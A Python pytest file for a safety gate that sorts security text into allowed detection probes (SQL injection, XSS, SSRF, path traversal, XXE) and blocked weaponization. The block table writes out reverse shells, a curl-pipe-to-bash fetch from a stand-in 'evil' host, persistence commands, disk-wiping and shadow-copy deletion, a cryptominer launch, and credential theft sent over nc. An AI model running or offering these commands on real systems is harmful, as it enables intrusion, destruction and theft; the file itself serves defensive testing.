"""Tests for the knowledge ingestion safety gate.

Two tables drive the suite: ALLOW_CASES are detection-grade PoCs that MUST be
ingestible, BLOCK_CASES are weaponization signatures that MUST be rejected.
Both tables are well over the required minimum so regressions surface fast.
"""

import sys
from pathlib import Path

import pytest

sys.path.insert(0, str(Path(__file__).resolve().parents[1]))

from core.selfimprove.safety_gate import classify_payload, is_allowed


# (text, expected_category) — every one of these MUST be allowed.
ALLOW_CASES = [
    ("' OR 1=1--", "clean"),
    ("admin'--", "clean"),
    ("1' UNION SELECT username,password FROM users--", "clean"),
    ("' OR SLEEP(5)--", "clean"),                       # time-based detection signal
    ("<svg onload=alert(1)>", "clean"),
    ('<img src=x onerror=alert(document.domain)>', "clean"),
    ("${7*7}", "clean"),                                 # SSTI probe
    ("{{7*7}}", "clean"),
    ("<%= 7*7 %>", "clean"),
    (";id", "clean"),                                    # benign read-only cmd marker
    ("|whoami", "clean"),
    ("`hostname`", "clean"),
    ("$(echo viper)", "clean"),
    ("http://169.254.169.254/latest/meta-data/", "clean"),   # SSRF probe
    ("http://[::ffff:169.254.169.254]/", "clean"),
    ("../../etc/passwd", "clean"),                       # path traversal probe
    ("....//....//etc/passwd", "clean"),
    ('{"$gt":""}', "clean"),                             # NoSQL injection probe
    ('{"$ne":null}', "clean"),
    ("<?xml version='1.0'?><!DOCTYPE r [<!ENTITY x SYSTEM 'file:///etc/passwd'>]>", "clean"),
    ("Origin: https://evil.example reflected in Access-Control-Allow-Origin", "clean"),
    ("eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiYWRtaW4ifQ.", "clean"),  # JWT alg:none probe
    ("https://target.com/redirect?url=https://evil.example", "clean"),  # open redirect
    ("Plain prose describing a CORS wildcard misconfiguration finding.", "clean"),
]


# (text, expected_category) — every one of these MUST be blocked.
BLOCK_CASES = [
    ("bash -i >& /dev/tcp/10.0.0.1/4444 0>&1", "reverse_bind_shell"),
    ("nc -e /bin/sh 10.0.0.1 4444", "reverse_bind_shell"),
    ("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i", "reverse_bind_shell"),
    ("import socket,subprocess,os; s=socket.socket(); os.dup2(s.fileno(),0); subprocess.call(['/bin/sh'])",
     "reverse_bind_shell"),
    ("powershell -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0AA==", "reverse_bind_shell"),
    ("powershell IEX (New-Object Net.WebClient).DownloadString('http://evil/a.ps1')",
     "reverse_bind_shell"),
    ("curl http://evil.sh | bash", "reverse_bind_shell"),
    ("(crontab -l; echo '* * * * * /tmp/implant') | crontab -", "persistence"),
    ("echo 'ssh-rsa AAAA... attacker' >> ~/.ssh/authorized_keys", "persistence"),
    ("reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v evil /d implant.exe",
     "persistence"),
    ("msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.1 -f exe", "c2_beacon"),
    ("beacon.dll loaded by the cobalt strike teamserver", "c2_beacon"),
    ("rm -rf / --no-preserve-root", "destructive"),
    ("DROP TABLE users;--", "destructive"),
    ("mkfs.ext4 /dev/sda1", "destructive"),
    (":(){ :|:& };:", "destructive"),
    ("del /f /s /q C:\\Windows\\System32", "destructive"),
    ("format C: /y", "destructive"),
    ("vssadmin delete shadows /all /quiet", "ransomware_wiper"),
    ("Your files have been encrypted, pay the ransom to recover them.", "ransomware_wiper"),
    ("xmrig -o stratum+tcp://pool.minexmr.com:4444 -u WALLET --donate-level 1", "cryptominer"),
    ("cat /etc/shadow | nc 10.0.0.1 9001", "mass_credential_exfil"),
    ("mimikatz # sekurlsa::logonpasswords", "mass_credential_exfil"),
    ("reg save HKLM\\SAM sam.hive", "mass_credential_exfil"),
]


@pytest.mark.parametrize("text,category", ALLOW_CASES)
def test_allow_cases(text, category):
    result = classify_payload(text)
    assert result["allowed"] is True, f"detection PoC wrongly blocked: {text!r} -> {result}"
    assert result["category"] == category
    assert is_allowed(text) is True


@pytest.mark.parametrize("text,category", BLOCK_CASES)
def test_block_cases(text, category):
    result = classify_payload(text)
    assert result["allowed"] is False, f"weaponization wrongly allowed: {text!r} -> {result}"
    assert result["category"] == category
    assert is_allowed(text) is False
    assert "blocked" in result["reason"].lower()


def test_minimum_table_sizes():
    assert len(ALLOW_CASES) >= 8
    assert len(BLOCK_CASES) >= 8


def test_return_shape():
    result = classify_payload("' OR 1=1--")
    assert set(result.keys()) == {"allowed", "reason", "category"}
    assert isinstance(result["allowed"], bool)
    assert isinstance(result["reason"], str)
    assert isinstance(result["category"], str)


def test_empty_and_whitespace_allowed():
    assert is_allowed("") is True
    assert is_allowed("   \n\t ") is True


def test_non_string_fails_closed():
    result = classify_payload(None)  # type: ignore[arg-type]
    assert result["allowed"] is False


def test_benign_marker_next_to_weaponization_is_blocked():
    # Even though ";id" is benign, the surrounding reverse shell must dominate.
    text = ";id; bash -i >& /dev/tcp/1.2.3.4/9 0>&1"
    result = classify_payload(text)
    assert result["allowed"] is False
    assert result["category"] == "reverse_bind_shell"
